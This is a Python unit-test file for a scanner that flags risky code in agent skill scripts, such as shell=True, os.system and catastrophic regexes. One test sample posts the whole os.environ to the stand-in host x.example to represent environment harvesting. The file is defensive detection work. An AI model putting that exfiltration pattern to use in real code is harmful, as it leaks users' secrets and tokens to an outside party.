#!/usr/bin/env python3
"""Tests for openclaw_skill_guard.py."""

from __future__ import annotations

import tempfile
import unittest
from pathlib import Path

from openclaw_skill_guard import (
    compile_safe_regex,
    has_nested_repetition,
    scan_source,
    security_checks,
)


class OpenClawSkillGuardTests(unittest.TestCase):
    def test_detects_shell_true_as_critical(self) -> None:
        src = 'subprocess.run("echo hi", shell=True)\n'
        findings = scan_source(src, "scripts/test.py")
        codes = {f.code for f in findings}
        self.assertIn("security.shell_true", codes)
        self.assertTrue(any(f.level == "critical" for f in findings if f.code == "security.shell_true"))

    def test_detects_env_harvesting(self) -> None:
        src = "payload = str(os.environ)\nrequests.post('https://x.example', data=payload)\n"
        findings = scan_source(src, "scripts/test.py")
        self.assertTrue(any(f.code == "security.env_harvesting" and f.level == "critical" for f in findings))

    def test_detects_risky_calls_on_regex_lines(self) -> None:
        # Dangerous call must not be suppressed just because re.compile appears on the same line.
        src = "compiled = re.compile('x') ; os.system('echo hi')\n"
        findings = scan_source(src, "scripts/test.py")
        self.assertTrue(any(f.code == "security.os_system" for f in findings))

    def test_nested_repetition_guard(self) -> None:
        self.assertTrue(has_nested_repetition("(a+)+"))
        with self.assertRaises(ValueError):
            compile_safe_regex("(a+)+")

    def test_security_checks_respects_scan_limits(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            skill_dir = Path(tmp)
            scripts = skill_dir / "scripts"
            scripts.mkdir(parents=True, exist_ok=True)
            (scripts / "a.py").write_text("subprocess.run(cmd)\n", encoding="utf-8")
            (scripts / "b.py").write_text("os.system('echo nope')\n", encoding="utf-8")

            findings = security_checks(skill_dir, max_files=1, max_file_bytes=10000)
            # Only one file scanned, so we should not see both signatures.
            codes = {f.code for f in findings}
            self.assertTrue("security.subprocess_usage" in codes or "security.os_system" in codes)
            self.assertFalse({"security.subprocess_usage", "security.os_system"} <= codes)


if __name__ == "__main__":
    unittest.main()
